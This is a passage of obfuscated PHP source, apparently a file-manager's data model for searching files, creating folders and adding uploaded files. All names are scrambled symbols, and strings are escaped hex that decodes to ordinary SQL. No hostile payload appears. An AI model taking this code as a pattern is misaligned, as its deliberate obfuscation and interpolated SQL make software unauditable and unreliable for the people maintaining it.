$•®™ğ›‘, $‰¢‡öÒ, $Ë”³); } private function _listSearchGroupTag(&$Æ‰™áÁ, $«òœäå, $üúÜ³š­) { $Ş×šŸ¾ä =& $_SERVER[Ã¶¡¶„æ]; if (!$«òœäå[$Ş×šŸ¾ä[1959]] || $Æ‰™áÁ[$Ş×šŸ¾ä[366]][$Ş×šŸ¾ä[353]] > 1 || !$«òœäå[$Ş×šŸ¾ä[432]]) { return; } $ğ¾ªËŠ¼ = $this->sourceInfo($«òœäå[$Ş×šŸ¾ä[432]]); if (!$ğ¾ªËŠ¼ || $ğ¾ªËŠ¼[$Ş×šŸ¾ä[411]] != SourceModel::TYPE_GROUP) { return; } $ÆÉ’éğ = $ğ¾ªËŠ¼[$Ş×šŸ¾ä[505]]; $ª ¿÷ê‡ = Model($Ş×šŸ¾ä[2121])->get($ÆÉ’éğ); $Êú¬ßù» = array(); $ÊÉöà§¨ = $«òœäå[$Ş×šŸ¾ä[1959]]; foreach ($ª ¿÷ê‡[$Ş×šŸ¾ä[369]] as $øÒ¯†ØÍ) { $á‰‰Ü€’ = $øÒ¯†ØÍ[$Ş×šŸ¾ä[32]]; $œ·Ë°öç = str_replace($Ş×šŸ¾ä[53], $Ş×šŸ¾ä[12], Pinyin::get($á‰‰Ü€’)); if (stripos($á‰‰Ü€’, $ÊÉöà§¨) !== !1 || stripos($œ·Ë°öç, $ÊÉöà§¨) !== !1) { $Êú¬ßù»[] = $øÒ¯†ØÍ[$Ş×šŸ¾ä[399]]; } } if (!$Êú¬ßù») { return; } $±ô™‚…ù = array($Ş×šŸ¾ä[426] => array($Ş×šŸ¾ä[7], $Êú¬ßù»), $Ş×šŸ¾ä[1676] => 0, $Ş×šŸ¾ä[33] => $Ş×šŸ¾ä[1981] . $ÆÉ’éğ); $±¯…Î×¸ = Model($Ş×šŸ¾ä[428])->field($Ş×šŸ¾ä[84])->where($±ô™‚…ù)->select(); $±¯…Î×¸ = array_to_keyvalue($±¯…Î×¸, $Ş×šŸ¾ä[12], $Ş×šŸ¾ä[84]); $²ûİéÒ = array_unique($±¯…Î×¸); $this->_listSearchMerge($Æ‰™áÁ, $«òœäå, $üúÜ³š­, $²ûİéÒ); } private function _listSearchMerge(&$•‡è¥¶İ, $³‡È Ì, $‚á®âÔÛ, $§À‹À) { $—é´ûù÷ =& $_SERVER[Ã¶¡¶„æ]; if (!$§À‹À) { return; } $úÓ„é­ô = array_to_keyvalue($•‡è¥¶İ[$—é´ûù÷[369]], $—é´ûù÷[12], $—é´ûù÷[402]); $±¢œÕ´ = array_diff($§À‹À, $úÓ„é­ô); if (!$±¢œÕ´) { return; } $úÅÜ–®ò = array($—é´ûù÷[402] => array($—é´ûù÷[7], $±¢œÕ´)); $îù˜”„§ = $this->field($‚á®âÔÛ)->where($úÅÜ–®ò)->select(); if (!$îù˜”„§) { return; } $•ÒÚ¡ğÒ = array(); foreach ($îù˜”„§ as $Í±Üöš) { if ($this->_listSearchFilter($Í±Üöš, $³‡È Ì)) { $•ÒÚ¡ğÒ[] = $Í±Üöš; } } $•‡è¥¶İ[$—é´ûù÷[369]] = array_merge($•ÒÚ¡ğÒ, $•‡è¥¶İ[$—é´ûù÷[369]]); $•‡è¥¶İ[$—é´ûù÷[366]][$—é´ûù÷[367]] += count($•ÒÚ¡ğÒ); } private function _listSearchFilter($©Ó‚ÀÃº, $ş×†³Ó¯) { $²ÄÎÔó =& $_SERVER[Ã¶¡¶„æ]; $Šç‡¾Ê´ = $©Ó‚ÀÃº[$²ÄÎÔó[410]] == $²ÄÎÔó[88]; if (!strstr($©Ó‚ÀÃº[$²ÄÎÔó[521]], $²ÄÎÔó[50] . $ş×†³Ó¯[$²ÄÎÔó[432]] . $²ÄÎÔó[50])) { return !1; } if (isset($ş×†³Ó¯[$²ÄÎÔó[412]]) && $ş×†³Ó¯[$²ÄÎÔó[412]] != $²ÄÎÔó[1920]) { if ($ş×†³Ó¯[$²ÄÎÔó[412]] == $²ÄÎÔó[75] && !$Šç‡¾Ê´) { return !1; } if ($ş×†³Ó¯[$²ÄÎÔó[412]] != $²ÄÎÔó[75] && $Šç‡¾Ê´) { return !1; } if (!strstr($©Ó‚ÀÃº[$²ÄÎÔó[174]], $²ÄÎÔó[50] . $ş×†³Ó¯[$²ÄÎÔó[412]] . $²ÄÎÔó[50])) { return !1; } } if (isset($ş×†³Ó¯[$²ÄÎÔó[2122]]) && $ş×†³Ó¯[$²ÄÎÔó[2122]] < $©Ó‚ÀÃº[$²ÄÎÔó[76]]) { return !1; } if (isset($ş×†³Ó¯[$²ÄÎÔó[2123]]) && $ş×†³Ó¯[$²ÄÎÔó[2123]] > $©Ó‚ÀÃº[$²ÄÎÔó[76]]) { return !1; } if (isset($ş×†³Ó¯[$²ÄÎÔó[600]]) && $ş×†³Ó¯[$²ÄÎÔó[600]] != $©Ó‚ÀÃº[$²ÄÎÔó[456]]) { return !1; } return !0; } public function listSearchChildren($ÅÒß°¿ï, $Ä“Ï¹Òß = 5000) { $®ÅÎü’ =& $_SERVER[Ã¶¡¶„æ]; $è–›ï¹á = array(); $·áî®Æ³ = $this->sourceInfo($ÅÒß°¿ï); $¢¬æÛáô = array($®ÅÎü’[521] => array($®ÅÎü’[383], $·áî®Æ³[$®ÅÎü’[521]] . $·áî®Æ³[$®ÅÎü’[402]] . $®ÅÎü’[551])); $“Ô¤³°Ñ = $this->field($®ÅÎü’[76])->where($¢¬æÛáô)->limit($Ä“Ï¹Òß + 1)->select(); $ òïõŠ® = is_array($“Ô¤³°Ñ) ? count($“Ô¤³°Ñ) : 0; if ($ òïõŠ® > $Ä“Ï¹Òß) { return $this->_listSearchChildrenNear($ÅÒß°¿ï, $Ä“Ï¹Òß); } $ŠÚŠêø = $this->field($®ÅÎü’[402])->where($¢¬æÛáô)->select(); $è–›ï¹á = array_to_keyvalue($ŠÚŠêø, $®ÅÎü’[12], $®ÅÎü’[402]); return $è–›ï¹á; } private function _listSearchChildrenNear($”àÀ»™Î, $ÁûÖ‡ÖÙ) { $¢×–‹Ãø =& $_SERVER[Ã¶¡¶„æ]; $ìúü¹Û½ = array(); $áÒŞ¯Õû = array($¢×–‹Ãø[432] => $”àÀ»™Î); $ïĞ´áôÂ = $this->field($¢×–‹Ãø[2124])->where($áÒŞ¯Õû)->select(); $ìÔ–„¦ = array_to_keyvalue(array_filter_by_field($ïĞ´áôÂ, $¢×–‹Ãø[410], $¢×–‹Ãø[88]), $¢×–‹Ãø[12], $¢×–‹Ãø[402]); $ìúü¹Û½ = array_merge($ìúü¹Û½, array_to_keyvalue($ïĞ´áôÂ, $¢×–‹Ãø[12], $¢×–‹Ãø[402])); if (!$ìÔ–„¦) { return $ìúü¹Û½; } $áÒŞ¯Õû = array($¢×–‹Ãø[432] => array($¢×–‹Ãø[7], $ìÔ–„¦)); $ïĞ´áôÂ = $this->field($¢×–‹Ãø[2124])->where($áÒŞ¯Õû)->limit($ÁûÖ‡ÖÙ)->select(); $ìúü¹Û½ = array_merge($ìúü¹Û½, array_to_keyvalue($ïĞ´áôÂ, $¢×–‹Ãø[12], $¢×–‹Ãø[402])); $ìúü¹Û½ = array_slice($ìúü¹Û½, 0, $ÁûÖ‡ÖÙ); return $ìúü¹Û½; } private function _listSearchBindPinyin($ß³ú™½, &$ÉÙÈØÕœ, &$™ì¾™÷œ) { $•Îñû =& $_SERVER[Ã¶¡¶„æ]; if (!isset($ß³ú™½[$•Îñû[1959]]) || !$ß³ú™½[$•Îñû[1959]]) { return; } if (!Input::check($ß³ú™½[$•Îñû[1959]], $•Îñû[318]) || strlen($ß³ú™½[$•Îñû[1959]]) < 2) { return; } $…œáĞúœ = "\x4c\105\106\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\163\157\x75\162\x63\145\137\x6d\145\164\x61\x20\155\x65\164\x61\x20\157\x6e\40\x73\157\x75\x72\x63\x65\56\x73\157\x75\162\143\x65\x49\104\x20\75\x20\x6d\x65\x74\x61\x2e\163\157\x75\162\143\x65\111\x44"; $Œ€áƒÀ = array(); $™ì¾™÷œ = str_replace(array($•Îñû[231], $•Îñû[53], $•Îñû[2125]), $•Îñû[12], $™ì¾™÷œ); $™ì¾™÷œ = $•Îñû[438] . str_replace($•Îñû[50], $•Îñû[439], $™ì¾™÷œ); $Ã®ƒÇÅ = $ÉÙÈØÕœ[$•Îñû[32]]; unset($ÉÙÈØÕœ[$•Îñû[32]]); foreach ($ÉÙÈØÕœ as $½µ­¯‘† => $˜Ì§¦Ü) { $Œ€áƒÀ[$•Îñû[438] . $½µ­¯‘†] = $˜Ì§¦Ü; } foreach ($Ã®ƒÇÅ as $í§½Š”š) { $Œ€áƒÀ[] = array($•Îñû[443] => $í§½Š”š, $•Îñû[1014] => $•Îñû[1963], array($•Îñû[2126] => $í§½Š”š, $•Îñû[2127] => array($•Îñû[7], array($•Îñû[465], $•Îñû[464])))); } $this->join($…œáĞúœ); $ÉÙÈØÕœ = $Œ€áƒÀ; } private function _parseSearchWhere($ßÁ„àÑş) { $ÜÃıĞäë =& $_SERVER[Ã¶¡¶„æ]; $ƒÖÙ„Œê = array(); if (isset($ßÁ„àÑş[$ÜÃıĞäë[767]]) && $ßÁ„àÑş[$ÜÃıĞäë[767]]) { $ƒÖÙ„Œê[$ÜÃıĞäë[85]] = array($ÜÃıĞäë[2128], $ßÁ„àÑş[$ÜÃıĞäë[767]]); } if (isset($ßÁ„àÑş[$ÜÃıĞäë[497]]) && $ßÁ„àÑş[$ÜÃıĞäë[497]]) { $Îâ­Îıà = array($ÜÃıĞäë[2129], $ßÁ„àÑş[$ÜÃıĞäë[497]]); if ($ƒÖÙ„Œê[$ÜÃıĞäë[85]]) { $ƒÖÙ„Œê[$ÜÃıĞäë[85]] = array($ƒÖÙ„Œê[$ÜÃıĞäë[85]], $Îâ­Îıà, $ÜÃıĞäë[2130]); } else { $ƒÖÙ„Œê[$ÜÃıĞäë[85]] = $Îâ­Îıà; } } if (isset($ßÁ„àÑş[$ÜÃıĞäë[2122]]) && $ßÁ„àÑş[$ÜÃıĞäë[2122]] > 0) { $ƒÖÙ„Œê[$ÜÃıĞäë[76]] = array($ÜÃıĞäë[2128], $ßÁ„àÑş[$ÜÃıĞäë[2122]]); } if (isset($ßÁ„àÑş[$ÜÃıĞäë[2123]]) && $ßÁ„àÑş[$ÜÃıĞäë[2123]]) { $Îâ­Îıà = array($ÜÃıĞäë[2129], $ßÁ„àÑş[$ÜÃıĞäë[2123]]); if ($ƒÖÙ„Œê[$ÜÃıĞäë[76]]) { $ƒÖÙ„Œê[$ÜÃıĞäë[76]] = array($ƒÖÙ„Œê[$ÜÃıĞäë[76]], $Îâ­Îıà, $ÜÃıĞäë[2130]); } else { $ƒÖÙ„Œê[$ÜÃıĞäë[76]] = $Îâ­Îıà; } } if (isset($ßÁ„àÑş[$ÜÃıĞäë[600]]) && $ßÁ„àÑş[$ÜÃıĞäë[600]]) { $ƒÖÙ„Œê[] = array($ÜÃıĞäë[456] => $ßÁ„àÑş[$ÜÃıĞäë[600]], $ÜÃıĞäë[454] => $ßÁ„àÑş[$ÜÃıĞäë[600]], $ÜÃıĞäë[1014] => $ÜÃıĞäë[1963]); } if (isset($ßÁ„àÑş[$ÜÃıĞäë[412]]) && $ßÁ„àÑş[$ÜÃıĞäë[412]]) { $Œª÷î¥ = $ßÁ„àÑş[$ÜÃıĞäë[412]]; if ($Œª÷î¥ == $ÜÃıĞäë[75]) { $ƒÖÙ„Œê[$ÜÃıĞäë[410]] = 1; } else { if ($Œª÷î¥ == $ÜÃıĞäë[2131]) { $ƒÖÙ„Œê[$ÜÃıĞäë[410]] = 0; } else { if ($Œª÷î¥) { $Œª÷î¥ = is_array($Œª÷î¥) ? $Œª÷î¥ : explode($ÜÃıĞäë[50], $Œª÷î¥); $ƒÖÙ„Œê[$ÜÃıĞäë[412]] = array($ÜÃıĞäë[418], $Œª÷î¥); $ƒÖÙ„Œê[$ÜÃıĞäë[410]] = 0; } } } } $this->_parseSearchParent($ßÁ„àÑş, $ƒÖÙ„Œê); if (isset($ßÁ„àÑş[$ÜÃıĞäë[1959]]) && trim($ßÁ„àÑş[$ÜÃıĞäë[1959]])) { $¨­ìÄæ = trim($ßÁ„àÑş[$ÜÃıĞäë[1959]]); $½îÆÖã¥ = explode($ÜÃıĞäë[53], $¨­ìÄæ); if (strlen($¨­ìÄæ) > 2 && (substr($¨­ìÄæ, 0, 1) == $ÜÃıĞäë[118] && substr($¨­ìÄæ, -1) == $ÜÃıĞäë[118]) || substr($¨­ìÄæ, 0, 1) == $ÜÃıĞäë[58] && substr($¨­ìÄæ, -1) == $ÜÃıĞäë[58]) { $¨­ìÄæ = substr($¨­ìÄæ, 1, -1); $½îÆÖã¥ = array($¨­ìÄæ); } $ƒÖÙ„Œê[$ÜÃıĞäë[32]] = array(array($ÜÃıĞäë[550], $ÜÃıĞäë[1961] . $¨­ìÄæ . $ÜÃıĞäë[1961])); if (count($½îÆÖã¥) > 1) { $ƒÖÙ„Œê[$ÜÃıĞäë[32]] = array(); foreach ($½îÆÖã¥ as $Ò¯ØüçŞ) { if (!trim($Ò¯ØüçŞ)) { continue; } $ƒÖÙ„Œê[$ÜÃıĞäë[32]][] = array($ÜÃıĞäë[550], $ÜÃıĞäë[1961] . trim($Ò¯ØüçŞ) . $ÜÃıĞäë[1961]); } } } return $ƒÖÙ„Œê; } private function _parseSearchParent($¨ãà°£ª, &$Âøê×ìé) { $•ï‡è´İ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($¨ãà°£ª[$•ï‡è´İ[432]]) || !$¨ãà°£ª[$•ï‡è´İ[432]]) { return; } $˜ÙòË™¶ = $this->pathInfo($¨ãà°£ª[$•ï‡è´İ[432]]); $Åë¤–şÒ = $˜ÙòË™¶[$•ï‡è´İ[432]] . $•ï‡è´İ[12] === $•ï‡è´İ[197]; $¡şÙŒ±… = $˜ÙòË™¶[$•ï‡è´İ[411]] == $•ï‡è´İ[515]; if ($˜ÙòË™¶[$•ï‡è´İ[532]] == $•ï‡è´İ[533]) { $ı†Û¸† = $this->sourceInfo($¨ãà°£ª[$•ï‡è´İ[432]]); $˜ÙòË™¶[$•ï‡è´İ[521]] = $ı†Û¸†[$•ï‡è´İ[521]]; } $Âøê×ìé[$•ï‡è´İ[590]] = array($•ï‡è´İ[550], $˜ÙòË™¶[$•ï‡è´İ[521]] . $¨ãà°£ª[$•ï‡è´İ[432]] . $•ï‡è´İ[551]); $’¥â¾óÏ = isset($¨ãà°£ª[$•ï‡è´İ[1824]]) && in_array($•ï‡è´İ[515], $¨ãà°£ª[$•ï‡è´İ[1824]]); if (!$’¥â¾óÏ || !$¡şÙŒ±… || !$Åë¤–şÒ || !$˜ÙòË™¶[$•ï‡è´İ[413]]) { return; } if (!AuthModel::authCheckRoot($˜ÙòË™¶[$•ï‡è´İ[413]][$•ï‡è´İ[414]])) { return; } $ìÒ¨„ÊÕ = $˜ÙòË™¶[$•ï‡è´İ[505]] . $•ï‡è´İ[12]; if ($ìÒ¨„ÊÕ == $•ï‡è´İ[88]) { unset($Âøê×ìé[$•ï‡è´İ[590]]); $Âøê×ìé[$•ï‡è´İ[411]] = self::TYPE_GROUP; return; } $È±Ò–ç¤ = Model($•ï‡è´İ[522])->groupChildrenAll($ìÒ¨„ÊÕ); $Ù¹˜”™à = count($È±Ò–ç¤); if ($Ù¹˜”™à <= 1) { return; } $–½´çø = array($•ï‡è´İ[432] => 0, $•ï‡è´İ[411] => self::TYPE_GROUP, $•ï‡è´İ[505] => array($•ï‡è´İ[7], $È±Ò–ç¤)); $¥Àşœ´ = $this->field($•ï‡è´İ[2132])->where($–½´çø)->limit($Ù¹˜”™à)->select(); $Âøê×ìé[$•ï‡è´İ[590]] = array(); foreach ($¥Àşœ´ as $¼Ê˜²×µ) { $Âøê×ìé[$•ï‡è´İ[590]][] = array($•ï‡è´İ[550], $•ï‡è´İ[531] . $¼Ê˜²×µ[$•ï‡è´İ[402]] . $•ï‡è´İ[551]); } $Âøê×ìé[$•ï‡è´İ[590]][] = $•ï‡è´İ[1963]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($îª„ÑÚ) { $Ã¹‚Â‰ =& $_SERVER[Ã¶¡¶„æ]; $×Ë—ÓÎ = Model($Ã¹‚Â‰[513])->where(array($Ã¹‚Â‰[1667] => $îª„ÑÚ))->find(); $àééå˜´ = $this->_mkdirRoot(SourceModel::TYPE_USER, $îª„ÑÚ, $×Ë—ÓÎ[$Ã¹‚Â‰[32]]); $this->userDesktopAdd($àééå˜´); return $àééå˜´; } public function userDesktopAdd($ÜĞÄÉÌÏ) { $½Ô«Çó =& $_SERVER[Ã¶¡¶„æ]; $æõ®úÜ = LNG($½Ô«Çó[2133]); $£óæ—ñï = $this->mkdir($ÜĞÄÉÌÏ, $æõ®úÜ); $this->metaSet($£óæ—ñï, $½Ô«Çó[2134], $½Ô«Çó[88]); $this->metaSet($ÜĞÄÉÌÏ, $½Ô«Çó[2135], $£óæ—ñï); } public function userPathSafeAdd($ó×Û°î) { $ÊëÁ‡© =& $_SERVER[Ã¶¡¶„æ]; $Ã¨›°òå = Model($ÊëÁ‡©[513])->getInfoFull($ó×Û°î); if (!$Ã¨›°òå) { return !1; } if (_get($Ã¨›°òå, $ÊëÁ‡©[536])) { return $Ã¨›°òå[$ÊëÁ‡©[466]][$ÊëÁ‡©[2136]]; } $¤˜ÌŒ¸ã = $this->_mkdirRoot(SourceModel::TYPE_USER, $ó×Û°î, $ÊëÁ‡©[2137], $ÊëÁ‡©[433]); Model($ÊëÁ‡©[513])->metaSet($ó×Û°î, $ÊëÁ‡©[2136], $¤˜ÌŒ¸ã); $this->metaSet($¤˜ÌŒ¸ã, $ÊëÁ‡©[2138], $ó×Û°î); return $¤˜ÌŒ¸ã; } public function groupRootAdd($Ïç¹î´“) { $ïä¥Ã…  =& $_SERVER[Ã¶¡¶„æ]; $Äë»éŒí = Model($ïä¥Ã… [522])->where(array($ïä¥Ã… [1953] => $Ïç¹î´“))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ïç¹î´“, $Äë»éŒí[$ïä¥Ã… [32]]); } public function systemRootPathAdd($§”˜›Ä¥) { if ($§”˜›Ä¥ != $_SERVER[Ã¶¡¶„æ][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $§”˜›Ä¥); } public function userRootRemove($Ïßİª‘Î) { $çğàä¡† = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ïßİª‘Î, !0); foreach ($çğàä¡† as $å¶ÍÓ—) { if (!$å¶ÍÓ—) { continue; } $this->remove($å¶ÍÓ—[$_SERVER[Ã¶¡¶„æ][402]], !1); } } public function groupRootRemove($Å´ÌäÆº) { $Ùáƒ‡ã = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Å´ÌäÆº); if (!$Ùáƒ‡ã) { return; } $this->remove($Ùáƒ‡ã[$_SERVER[Ã¶¡¶„æ][402]], !1); } private function _mkdirRoot($¥ŸïĞ‡—, $‚¤ş—õ, $„•²²¤ó, $Õ¡³ìı× = '') { $ë–Ñ¡á© =& $_SERVER[Ã¶¡¶„æ]; $ÄÅü…æ = array($ë–Ñ¡á©[401] => 0, $ë–Ñ¡á©[586] => $¥ŸïĞ‡—, $ë–Ñ¡á©[587] => $‚¤ş—õ, $ë–Ñ¡á©[583] => 1, $ë–Ñ¡á©[588] => USER_ID, $ë–Ñ¡á©[589] => USER_ID, $ë–Ñ¡á©[584] => $Õ¡³ìı×, $ë–Ñ¡á©[590] => $ë–Ñ¡á©[531], $ë–Ñ¡á©[430] => 0, $ë–Ñ¡á©[585] => 0, $ë–Ñ¡á©[469] => 0, $ë–Ñ¡á©[591] => $ë–Ñ¡á©[12]); if ($¶ŠµÖôä = $this->where($ÄÅü…æ)->find()) { return $¶ŠµÖôä[$ë–Ñ¡á©[402]]; } $íõ·œ­È = "\115\x6f\144\x65\x6c\123\157\x75\162\143\x65\56\x6d\153\144\x69\162\x52\x6f\157\164\56{$¥ŸïĞ‡—}\56{$‚¤ş—õ}\x2e" . $„•²²¤ó; CacheLock::lock($íõ·œ­È); $ÄÅü…æ[$ë–Ñ¡á©[32]] = $„•²²¤ó; $ò¯ÑöÑ = $this->add($ÄÅü…æ); $é÷êúûİ = array($ë–Ñ¡á©[592] => short_id($ò¯ÑöÑ)); $this->where(array($ë–Ñ¡á©[417] => $ò¯ÑöÑ))->save($é÷êúûİ); CacheLock::unlock($íõ·œ­È); return $ò¯ÑöÑ; } private function targetSourceRoot($±÷§³Ø‡, $Ñ¡†éı, $ã¦˜®…à = false) { $³ÀÉÒşõ =& $_SERVER[Ã¶¡¶„æ]; $€¼ãßİ½ = array($³ÀÉÒşõ[401] => 0, $³ÀÉÒşõ[586] => $±÷§³Ø‡, $³ÀÉÒşõ[587] => $Ñ¡†éı); if ($ã¦˜®…à) { $ÑÛÆ¨š = $this->where($€¼ãßİ½)->select(); return $ÑÛÆ¨š ? $ÑÛÆ¨š : array(); } $®é’ä©„ = $this->where($€¼ãßİ½)->find(); return $®é’ä©„ ? $®é’ä©„ : array(); } public function sourceRootGroup($şœ¥—ˆß) { $ò§ëòéÓ =& $_SERVER[Ã¶¡¶„æ]; if (is_string($şœ¥—ˆß)) { $şœ¥—ˆß = array($şœ¥—ˆß); } $Ãò½¼ùó = $this->listSourceRoot(SourceModel::TYPE_GROUP, $şœ¥—ˆß, $ò§ëòéÓ[188]); $ÃÜç¬„ = array($ò§ëòéÓ[369] => $Ãò½¼ùó, $ò§ëòéÓ[366] => array($ò§ëòéÓ[765] => count($şœ¥—ˆß))); $this->_listDataApply($ÃÜç¬„[$ò§ëòéÓ[369]]); $this->_listMake($ÃÜç¬„); return array_to_keyvalue($ÃÜç¬„[$ò§ëòéÓ[82]], $ò§ëòéÓ[505]); } public function mkfile($™Ñ¢·Ï†, $ÓÒ¡ªæ, $õÊÌæ‡å = '', $Õ­ñ¢‹ß = REPEAT_RENAME) { $ŒõÑÉİˆ =& $_SERVER[Ã¶¡¶„æ]; $”ºß¢×Ö = Model($ŒõÑÉİˆ[609])->addFileByContent($õÊÌæ‡å, $ÓÒ¡ªæ); return $this->_createFileCall($™Ñ¢·Ï†, $ÓÒ¡ªæ, $”ºß¢×Ö, $Õ­ñ¢‹ß, $ŒõÑÉİˆ[1361]); } public function addFile($òˆ‚ì¦×, $ÊØ¦èüç, $à˜êÇ²», $§‚¾öµ‹ = false, $Ş¢õÕòĞ = REPEAT_RENAME) { $Øú«‘Î› = Model($_SERVER[Ã¶¡¶„æ][609])->addFile($ÊØ¦èüç, $à˜êÇ²», $§‚¾öµ‹); return $this->_createFileCall($òˆ‚ì¦×, $à˜êÇ²», $Øú«‘Î›, $Ş¢õÕòĞ); } public function addFileByFileID($¹Â³Ä†, $š»·¥²¹, $µ¥ŒÜÖ®, $¦’œÑ¦Â = REPEAT_RENAME) { $³Ğ×¢¹ =& $_SERVER[Ã¶¡¶„æ]; $”ùÇÖùÂ = Model($³Ğ×¢¹[609])->find($š»·¥²¹); Model($³Ğ×¢¹[609])->linkAdd($š»·¥²¹); return $this->_createFileCall($¹Â³Ä†, $µ¥ŒÜÖ®, $”ùÇÖùÂ, $¦’œÑ¦Â); } public function addFileByRemote($ì¸´¨òˆ, $¾‘Ù“êã, $†ï˜Ìú’, $•ì…—Àà = array(), $ğá¯ğÀè = REPEAT_RENAME) { $ÛüÇÃ¿å = Model($_SERVER[Ã¶¡¶„æ][609])->addFileByRemote($¾‘Ù“êã, $†ï˜Ìú’, $•ì…—Àà); return $this->_createFileCall($ì¸´¨òˆ, $†ï˜Ìú’, $ÛüÇÃ¿å, $ğá¯ğÀè); } private function _createFileCall($Û—¤½®¯, $ü„›§ÜÕ, $š©ÎÉòÊ, $°²¢éí, $’ñÎ§û = "\x75\160\154\x6f\141\144") { $¤ˆˆóÁ =& $_SERVER[Ã¶¡¶„æ]; $ÀãÎ”û› = !1; $this->setMasterDB(); $this->lockWriteStart($Û—¤½®¯, $ü„›§ÜÕ); $„ ‰Ì¾ï = $this->fileNameExist($Û—¤½®¯, $ü„›§ÜÕ); $¡‹å¯ÃÄ = $this->_createFile($Û—¤½®¯, $ü„›§ÜÕ, $š©ÎÉòÊ, $°²¢éí, $ÀãÎ”û›); if (!$ÀãÎ”û›) { Model($¤ˆˆóÁ[471])->remove($š©ÎÉòÊ[$¤ˆˆóÁ[468]]); } if ($ÀãÎ”û› && $¡‹å¯ÃÄ && $¡‹å¯ÃÄ != $„ ‰Ì¾ï) { Model($¤ˆˆóÁ[2106])->eventCreate($¡‹å¯ÃÄ, $’ñÎ§û); } $this->lockWriteEnd($Û—¤½®¯, $ü„›§ÜÕ); return $¡‹å¯ÃÄ; } public function mkdir($Ô½å¦, $ôê‘¨ºë, $¦¾—–¾Ë = REPEAT_SKIP) { $Áâê™”„ =& $_SERVER[Ã¶¡¶„æ]; $this->setMasterDB(); $›¼ŞÍò = $this->sourceInfo($Ô½å¦); if (!$›¼ŞÍò) { return !1; } $this->lockWriteStart($Ô½å¦, $ôê‘¨ºë); if ($¦¾—–¾Ë !== !1) { $—­¤§í = $this->fileNameExist($Ô½å¦, $ôê‘¨ºë); if ($—­¤§í && $¦¾—–¾Ë != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ô½å¦, $ôê‘¨ºë); return $—­¤§í; } $ôê‘¨ºë = $this->fileNameAuto($Ô½å¦, $ôê‘¨ºë, $¦¾—–¾Ë); } $¶ïø©´ = array($Áâê™”„[583] => 1, $Áâê™”„[420] => $ôê‘¨ºë, $Áâê™”„[584] => $Áâê™”„[12], $Áâê™”„[469] => 0, $Áâê™”„[585] => 0); $Ö±Ùø¿ = $this->_addSource($¶ïø©´, $›¼ŞÍò); Model($Áâê™”„[2106])->eventCreate($Ö±Ùø¿, $Áâê™”„[1362]); $this->lockWriteEnd($Ô½å¦, $ôê‘¨ºë); return $Ö±Ùø¿; } public function listSourceRoot($ƒÀùæ£ç, $äö€Ğ‡ƒ, $¿ê´²ªœ = "\x73\x6f\x75\162\x63\x65\x49\104\x2c\164\x61\x72\x67\145\164\x49\104\54\x73\151\172\x65") { $¨œİí÷ë =& $_SERVER[Ã¶¡¶„æ]; $Œà•­¦õ = $¨œİí÷ë[378]; $šá¹õñÜ = array(); $é›£ìõ™ = 1024 * 50; $˜’×Ç˜ = is_array($˜’×Ç˜) ? $˜’×Ç˜ : array(); $ĞÄüß• = count($äö€Ğ‡ƒ); $ù†æäµ = $this->tablePrefix . $¨œİí÷ë[2139]; for ($»­½¤ØÒ = 0; $»­½¤ØÒ < $ĞÄüß•; $»­½¤ØÒ++) { $ÆúÈŸ¡Ğ = $äö€Ğ‡ƒ[$»­½¤ØÒ]; $Œà•­¦õ .= "\x53\105\x4c\105\x43\x54\x20\x2a\40\x46\x52\x4f\115\x20\50\123\105\114\105\x43\x54\40{$¿ê´²ªœ}\x20\x46\122\x4f\115\x20\x60{$ù†æäµ}\140\x20\x57\110\105\x52\105\x20"; $Œà•­¦õ .= "\x60\x70\141\x72\145\156\164\x49\104\x60\x3d\x30\40\101\116\104\40\x60\x74\141\162\147\145\164\111\x44\x60\x3d{$ÆúÈŸ¡Ğ}\x20\x41\116\x44\40\x60\x74\141\x72\147\145\x74\x54\x79\x70\145\x60\x3d{$ƒÀùæ£ç}\x20\x61\156\x64\x20\x66\x69\x6c\x65\124\x79\x70\145\75\x27\x27\40\x6c\x69\155\x69\x74\40\x31\51\40\141\x73\x20\x74\x62\137{$»­½¤ØÒ}\40\x55\116\x49\x4f\116\40\x41\x4c\114\x20"; if ((strlen($Œà•­¦õ) >= $é›£ìõ™ || $»­½¤ØÒ == $ĞÄüß• - 1) && $Œà•­¦õ) { $Œà•­¦õ = substr($Œà•­¦õ, 0, -strlen($¨œİí÷ë[1052])); $ğ¨Ó×Ê„ = $this->query($Œà•­¦õ); $Œà•­¦õ = $¨œİí÷ë[12]; $šá¹õñÜ = array_merge($šá¹õñÜ, $ğ¨Ó×Ê„); } } return $šá¹õñÜ; } private function _createFile($ÜªÁÑ‚, $ÍØŞï£œ, $öÔ×”¥â, $üòËà°, &$¨ë†£…) { $ÎƒìÚ‚† =& $_SERVER[Ã¶¡¶„æ]; $Èôï…Ãò = $this->sourceInfo($ÜªÁÑ‚); if (!$öÔ×”¥â || !$Èôï…Ãò) { return !1; } if ($üòËà° !== !1) { $Ÿµìá ³ = $this->fileNameExist($ÜªÁÑ‚, $ÍØŞï£œ); } $¨ë†£… = !0; if ($üòËà° && $Ÿµìá ³) { if ($üòËà° == REPEAT_SKIP) { $¨ë†£… = !1; return $Ÿµìá ³; } else { if ($üòËà° == REPEAT_REPLACE) { $ÊµéíĞî = $this->sourceInfo($Ÿµìá ³); $ÎŸŒ¡»¹ = $this->fileHistory($ÊµéíĞî, $öÔ×”¥â[$ÎƒìÚ‚†[468]], $öÔ×”¥â[$ÎƒìÚ‚†[76]]); if (!$ÎŸŒ¡»¹) { $¨ë†£… = !1; } else { $this->folderSizeReset($ÜªÁÑ‚); } return $Ÿµìá ³; } else { $ÍØŞï£œ = $this->fileNameAuto($ÜªÁÑ‚, $ÍØŞï£œ, $üòËà°, !1); } } } $Š»Ñ† = array($ÎƒìÚ‚†[583] => 0, $ÎƒìÚ‚†[420] => $ÍØŞï£œ, $ÎƒìÚ‚†[584] => substr(get_path_ext($ÍØŞï£œ), 0, 10), $ÎƒìÚ‚†[469] => $öÔ×”¥â[$ÎƒìÚ‚†[468]], $ÎƒìÚ‚†[585] => $öÔ×”¥â[$ÎƒìÚ‚†[76]]); $Şù¢Ì¤Ö = $this->_addSource($Š»Ñ†, 